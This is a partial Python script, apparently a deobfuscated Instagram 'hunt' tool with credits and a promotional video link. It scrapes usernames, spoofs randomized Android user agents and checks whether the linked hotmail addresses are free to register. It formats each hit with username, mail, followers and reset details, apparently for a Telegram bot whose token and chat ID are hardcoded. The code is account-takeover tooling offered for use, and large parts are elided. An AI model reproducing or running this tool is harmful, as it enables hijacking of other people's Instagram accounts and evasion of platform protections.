# DECODE BY:- IAmHackerAlok
# COPYRIGHT:- @Grayhacker_Bot
...
######L7N#####
print(X + 'DecoDed By Alok Indian : @GrayHacker_bot' + '\n\n' + '\033[0m')
nnn = random.choice([R,X,F,B,K,V])
good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
tok = "7309924198:AAEZvP2Mlh_3FYI1NRSDiRlhaKXTbcxaiD0"
print("\r")
iD = "1131396073"
os.system('clear')
def cookie(email):
...
""");hunt = ("""
New Hunt Dropped, Good Luck Dude!

⋘━─━اHacker Alok Enjoy Ig 😁 🔥🇸🇾━─━⋙ 
Ad : {}
Username : {}
Mail : {}@hotmail.com
Followers : {}
...
Reset : {}
⋘━─━اHacker Alok Enjoy Ig 😁 🔥🇸🇾━─━⋙ 
by : https://www.instagram.com/hacker_alok1

How to Access This indo watch video -: https://youtu.be/dwEKlG4KvLA?si=ooB1UBdNLG8wuY5Q		
...
def check_email(email):
	...
	bo = f'\x1b[38;5;{b}m'
	check+=1
	sys.stdout.write(f"\r   {bo}[ {C}QNB {bo}] {C}Hit : {F}{good_hot}  {C}Bad Email : {R}{bad_ig}  {C}Nice IG : {X}{good_ig}  {C}{bo}Denetlenen•{check}\r")
	sys.stdout.flush()
...
def username1():
  ...
  try:
    while True:      
      ...
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN9999999999') for _ in range(32))
      headers = {
    'accept': '*/*',
